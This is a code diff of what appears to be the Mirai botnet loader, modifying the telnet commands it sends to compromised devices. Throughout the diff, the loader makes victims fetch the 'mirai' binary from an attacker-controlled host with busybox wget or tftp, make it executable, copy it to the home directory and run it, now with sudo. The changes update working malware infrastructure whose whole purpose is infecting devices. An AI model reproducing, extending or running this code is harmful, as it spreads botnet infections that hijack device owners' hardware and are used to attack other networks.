@@ -277,6 +277,12 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 				abort();
 			}
 
+#ifdef DEBUG
+            const char* csz_ext = ".dbg";
+#else
+            const char* csz_ext = "";
+#endif
+
             while (TRUE)
             {
                 int consumed;
@@ -293,7 +299,8 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         printf("Waiting user prompt...\n");
                         #endif
                         printf("Leading: %02x\n", conn->rdbuf[0]);
-                        if (conn->rdbuf[0] == 0xff){
+                        if (conn->rdbuf[0] == 0xff)
+                        {
                           consumed = connection_consume_iacs(conn);
                         }
                         consumed = connection_consume_login_prompt(conn);
@@ -401,7 +408,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             {
                                 conn->state_telnet = TELNET_UPLOAD_METHODS;
                                 conn->timeout = 15;
-                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
+                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox-extras tftp; " TOKEN_QUERY "\r\n");
                             }
                         }
                         break;
@@ -428,9 +435,9 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             else
                             {
 #ifdef DEBUG
-                                printf("[FD%d] Detected architecture: '%s'\n", ev->data.fd, conn->info.arch);
+                                printf("[FD%d] Detected architecture: \'%s\'\n", ev->data.fd, conn->info.arch);
 #endif
-                                util_sockprintf(conn->fd, "/bin/busybox no-wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
+                                util_sockprintf(conn->fd, "/bin/busybox no-wget; /bin/busybox-extras tftp; " TOKEN_QUERY "\r\n");
                                 conn->state_telnet = TELNET_UPLOAD_METHODS;
                             }
                         }
@@ -449,7 +456,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                             else
                                 conn->bin = bin;
 
-                            util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
+                            util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox-extras tftp; " TOKEN_QUERY "\r\n");
                             conn->state_telnet = TELNET_UPLOAD_METHODS;
                         }
                         break;
@@ -466,7 +473,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                 case UPLOAD_ECHO:
                                     conn->state_telnet = TELNET_UPLOAD_ECHO;
                                     conn->timeout = 30;
-                                    util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
+                                    util_sockprintf(conn->fd, "/bin/busybox cp " FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; /bin/busybox cp " FN_BINARY " ~/" FN_BINARY "; " TOKEN_QUERY "\r\n");
 #ifdef DEBUG
                                     printf("echo\n");
 #endif
@@ -474,8 +481,8 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                 case UPLOAD_WGET:
                                     conn->state_telnet = TELNET_UPLOAD_WGET;
                                     conn->timeout = 120;
-                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
-                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "mirai", conn->info.arch);
+                                    util_sockprintf(conn->fd, "/bin/busybox-extras wget http://%s:%d/bins/%s.%s%s -O - > " FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; /bin/busybox cp " FN_BINARY " ~/" FN_BINARY "; " TOKEN_QUERY "\r\n",
+                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "mirai", conn->info.arch, csz_ext);
 #ifdef DEBUG
                                     printf("wget\n");
 #endif
@@ -483,8 +490,8 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                 case UPLOAD_TFTP:
                                     conn->state_telnet = TELNET_UPLOAD_TFTP;
                                     conn->timeout = 120;
-                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
-                                                    FN_BINARY, "mirai", conn->info.arch, wrker->srv->tftp_host_ip);
+                                    util_sockprintf(conn->fd, "/bin/busybox-extras tftp -g -l %s -r %s.%s%s %s; /bin/busybox chmod 777 " FN_BINARY "; /bin/busybox cp " FN_BINARY " ~/" FN_BINARY "; " TOKEN_QUERY "\r\n",
+                                                    FN_BINARY, "mirai", conn->info.arch, csz_ext, wrker->srv->tftp_host_ip);
 #ifdef DEBUG
                                     printf("tftp\n");
 #endif
@@ -501,7 +508,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 #ifdef DEBUG
                             printf("[FD%d] Finished echo loading!\n", conn->fd);
 #endif
-                            util_sockprintf(conn->fd, "./%s; ./%s %s.%s; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, id_tag, conn->info.arch);
+                            util_sockprintf(conn->fd, "sudo ~/%s; ./%s %s.%s; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, id_tag, conn->info.arch);
                             ATOMIC_INC(&wrker->srv->total_echoes);
                         }
                         break;
@@ -514,7 +521,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 #ifdef DEBUG
                             printf("[FD%d] Finished wget loading\n", conn->fd);
 #endif
-                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
+                            util_sockprintf(conn->fd, "sudo ~/" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                             ATOMIC_INC(&wrker->srv->total_wgets);
                         }
                         break;
@@ -527,7 +534,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
 #ifdef DEBUG
                             printf("[FD%d] Finished tftp loading\n", conn->fd);
 #endif
-                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
+                            util_sockprintf(conn->fd, "sudo ~/" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                             ATOMIC_INC(&wrker->srv->total_tftps);
                         }
                         else if (consumed < -1) // Did not have permission to TFTP
@@ -564,7 +571,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                     conn->echo_load_pos = 0;
                                     strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                                     conn->bin = binary_get_by_arch(conn->info.arch);
-                                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
+                                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox-extras tftp; " TOKEN_QUERY "\r\n");
                                     conn->state_telnet = TELNET_UPLOAD_METHODS;
                                     conn->retry_bin = TRUE;
                                     break;
@@ -646,7 +653,7 @@ static void *timeout_thread(void *arg)
                     conn->echo_load_pos = 0;
                     strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                     conn->bin = binary_get_by_arch(conn->info.arch);
-                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
+                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox-extras tftp; " TOKEN_QUERY "\r\n");
                     conn->state_telnet = TELNET_UPLOAD_METHODS;
                     conn->retry_bin = TRUE;
                 } else {
